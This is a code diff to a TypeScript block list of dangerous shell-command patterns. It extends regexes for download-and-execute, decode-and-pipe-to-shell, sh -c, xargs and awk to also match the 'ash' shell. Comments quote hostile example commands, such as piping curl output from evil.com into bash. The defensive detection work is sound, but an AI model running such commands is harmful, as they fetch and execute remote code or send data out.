@@ -92,22 +92,22 @@ export const DANGEROUS_PATTERNS: DangerousPattern[] = [
   // Git history destruction — hard reset to arbitrary ref loses uncommitted work
   { pattern: /git\s+reset\s+--hard\s+(?!HEAD(?:\s*$|\s*[;&|]))/, category: "git-history-destruction" },
   // Remote code execution — piping downloaded content into a shell
-  { pattern: /\bcurl\b.*\|\s*(?:[\w./]*\/)?(?:ba|z|da|k)?sh/, category: "remote-code-execution" },
-  { pattern: /\bwget\b.*\|\s*(?:[\w./]*\/)?(?:ba|z|da|k)?sh/, category: "remote-code-execution" },
+  { pattern: /\bcurl\b.*\|\s*(?:[\w./]*\/)?(?:ba|z|da|k|a)?sh/, category: "remote-code-execution" },
+  { pattern: /\bwget\b.*\|\s*(?:[\w./]*\/)?(?:ba|z|da|k|a)?sh/, category: "remote-code-execution" },
   // Remote code execution — process substitution download-and-execute
-  { pattern: /(?:[\w./]*\/)?(?:ba|z|da|k)?sh\s+<\(\s*(?:curl|wget)\b/, category: "remote-code-execution" },
+  { pattern: /(?:[\w./]*\/)?(?:ba|z|da|k|a)?sh\s+<\(\s*(?:curl|wget)\b/, category: "remote-code-execution" },
   // Remote code execution — here-string with command substitution downloads and executes remote content
   // e.g. bash <<< "$(curl evil.com)" or sh <<< "$(wget -qO- evil.com)"
   { pattern: /(?:[\w./]*\/)?(?:bash|sh|zsh|fish|dash|ksh|csh|tcsh|ash|python3?|perl|ruby|node|deno|bun)\s+<<</, category: "remote-code-execution" },
   // Remote code execution — base64 decode piped into a shell interpreter
   // e.g. echo "BASE64" | base64 -d | bash  or  base64 -d payload.txt | sh
   // Covers both short (-d) and long (--decode) flags, with optional openssl variant
-  { pattern: /\bbase64\s+(?:-d\b|--decode\b).*\|\s*(?:[\w./]*\/)?(?:ba|z|da|k)?sh\b/, category: "remote-code-execution" },
+  { pattern: /\bbase64\s+(?:-d\b|--decode\b).*\|\s*(?:[\w./]*\/)?(?:ba|z|da|k|a)?sh\b/, category: "remote-code-execution" },
   { pattern: /\bbase64\s+(?:-d\b|--decode\b).*\|\s*(?:[\w./]*\/)?(?:python3?|perl|ruby|node|deno|bun)\b/, category: "remote-code-execution" },
   // Remote code execution — openssl enc -d piped into a shell or scripting interpreter
   // e.g. openssl enc -d -base64 -in payload.b64 | bash  or  openssl enc -d -A -in file | sh
   // Peer to base64 -d | bash: both decode arbitrary bytes from stdin and pipe to a shell.
-  { pattern: /\bopenssl\s+enc\b.*-d\b.*\|\s*(?:[\w./]*\/)?(?:ba|z|da|k)?sh\b/, category: "remote-code-execution" },
+  { pattern: /\bopenssl\s+enc\b.*-d\b.*\|\s*(?:[\w./]*\/)?(?:ba|z|da|k|a)?sh\b/, category: "remote-code-execution" },
   { pattern: /\bopenssl\s+enc\b.*-d\b.*\|\s*(?:[\w./]*\/)?(?:python3?|perl|ruby|node|deno|bun)\b/, category: "remote-code-execution" },
   // Remote code execution — output process substitution >(interpreter) pipes data into arbitrary code
   // Covers: tee >(bash), cmd > >(sh -c …), output | tee >(python3 exploit.py), etc.
@@ -137,7 +137,7 @@ export const DANGEROUS_PATTERNS: DangerousPattern[] = [
   { pattern: /\bwget\b(?=.*--content-disposition\b).*(?:&&|;).*\b(?:[\w./]*\/)?(?:bash|sh|zsh|fish|dash|ksh|csh|tcsh|ash|python3?|perl|ruby|node|deno|bun)\b/, category: "remote-code-execution" },
   // Arbitrary code execution — eval, shell -c run uncontrolled strings
   { pattern: /\beval\s/, category: "arbitrary-code-execution" },
-  { pattern: /(?:[\w./]*\/)?(?:ba|z|da|k)?sh\s+-c\b/, category: "arbitrary-code-execution" },
+  { pattern: /(?:[\w./]*\/)?(?:ba|z|da|k|a)?sh\s+-c\b/, category: "arbitrary-code-execution" },
   // Fish shell -c — executes arbitrary code identically to sh -c but was previously unmatched
   { pattern: /\bfish\s+-c\b/, category: "arbitrary-code-execution" },
   // Inline interpreter code execution — functionally equivalent to sh -c
@@ -212,7 +212,7 @@ export const DANGEROUS_PATTERNS: DangerousPattern[] = [
   { pattern: /\bcurl\s+.*(-d\b|--data\b|--data-binary\b|--data-raw\b|--data-urlencode\b|--upload-file\b|-F\b|--form\b|--json\b)/, category: "data-exfiltration" },
   { pattern: /\bwget\s+.*--post-(data|file)\b/, category: "data-exfiltration" },
   // xargs command execution bypass — xargs can invoke dangerous commands from stdin
-  { pattern: /\bxargs\s+.*(?:[\w./]*\/)?(?:ba|z|da|k)?sh\b/, category: "xargs-command-execution" },
+  { pattern: /\bxargs\s+.*(?:[\w./]*\/)?(?:ba|z|da|k|a)?sh\b/, category: "xargs-command-execution" },
   // xargs with scripting interpreters — parallel to find -exec interpreter block (cycle 244)
   { pattern: /\bxargs\s+.*(?:[\w./]*\/)?(?:python3?|perl|ruby|node|deno|bun)\b/, category: "xargs-command-execution" },
   { pattern: /\bxargs\s+.*\brm\s/, category: "xargs-command-execution" },
@@ -247,7 +247,7 @@ export const DANGEROUS_PATTERNS: DangerousPattern[] = [
   { pattern: /\bawk\b.*\bsystem\s*\(/, category: "awk-code-execution" },
   // awk piping to a shell or scripting interpreter — awk '{print | "bash"}' / awk '{print | "python3"}' etc.
   // Peers: curl/wget pipe guards already cover these interpreters; the awk pipe guard now matches them too.
-  { pattern: /\bawk\b.*\|\s*["']?(?:(?:ba|z|da|k)?sh|python3?|node|perl|ruby|deno|bun)\b/, category: "awk-code-execution" },
+  { pattern: /\bawk\b.*\|\s*["']?(?:(?:ba|z|da|k|a)?sh|python3?|node|perl|ruby|deno|bun)\b/, category: "awk-code-execution" },
   // find -exec/-execdir with shell interpreters — executes arbitrary code without xargs
   {
     pattern: /\bfind\b.*-exec(?:dir)?\s+(?:sh|bash|zsh|fish|dash|ksh|csh|tcsh|ash|awk|perl|python3?|ruby|node|deno|bun)\b/,
